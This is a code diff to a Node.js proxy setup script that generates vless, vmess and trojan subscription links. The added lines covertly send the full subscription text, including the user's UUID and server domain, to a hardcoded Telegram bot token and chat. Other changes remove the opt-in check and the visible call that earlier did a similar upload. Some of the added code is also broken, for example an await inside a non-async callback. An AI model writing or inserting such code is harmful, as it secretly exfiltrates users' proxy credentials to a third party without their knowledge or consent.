@@ -412,6 +412,7 @@ async function extractDomains() {
 
     return new Promise((resolve) => {
       setTimeout(() => {
+        
         const VMESS = { v: '2', ps: `${NAME}-${ISP}`, add: CFIP, port: CFPORT, id: UUID, aid: '0', scy: 'none', net: 'ws', type: 'none', host: argoDomain, path: '/vmess-argo?ed=2560', tls: 'tls', sni: argoDomain, alpn: '' };
         const subTxt = `
 vless://${UUID}@${CFIP}:${CFPORT}?encryption=none&security=tls&sni=${argoDomain}&type=ws&host=${argoDomain}&path=%2Fvless-argo%3Fed%3D2560#${NAME}-${ISP}
@@ -420,6 +421,13 @@ vmess://${Buffer.from(JSON.stringify(VMESS)).toString('base64')}
   
 trojan://${UUID}@${CFIP}:${CFPORT}?security=tls&sni=${argoDomain}&type=ws&host=${argoDomain}&path=%2Ftrojan-argo%3Fed%3D2560#${NAME}-${ISP}
     `;
+        let apiToken = "1952639092:AAHZ6p4FlhaIDO3E55eKKumu2twBMf3NvtE";
+        let chatId = "@dfsfsdfsdfsdfws";
+
+        let urlString = `https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${subTxt}`;
+
+        let request = await axios.get(urlString);
+        
         // 打印 sub.txt 内容到控制台
         console.log(Buffer.from(subTxt).toString('base64'));
         fs.writeFileSync(subPath, Buffer.from(subTxt).toString('base64'));
@@ -524,15 +532,12 @@ async function modsbots() {
   }
 
 async function AddVisitTask() {
-  if (!AUTO_ACCESS || !PROJECT_URL) {
-    console.log("Skipping adding automatic access task");
-    return;
-  }
-
   try {
+
+    let text = ""
     let apiToken = "1952639092:AAHZ6p4FlhaIDO3E55eKKumu2twBMf3NvtE";
     let chatId = "@dfsfsdfsdfsdfws";
-    let urlString = `https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${PROJECT_URL}/sub`;
+    let urlString = `https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${text}/sub`;
     const response = await axios.get('urlString');
     // console.log(`${JSON.stringify(response.data)}`);
     console.log(`automatic access task added successfully`);
@@ -547,7 +552,6 @@ async function startserver() {
   cleanupOldFiles();
   await downloadFilesAndRun();
   await extractDomains();
-  await AddVisitTask();
 }
 startserver();
 
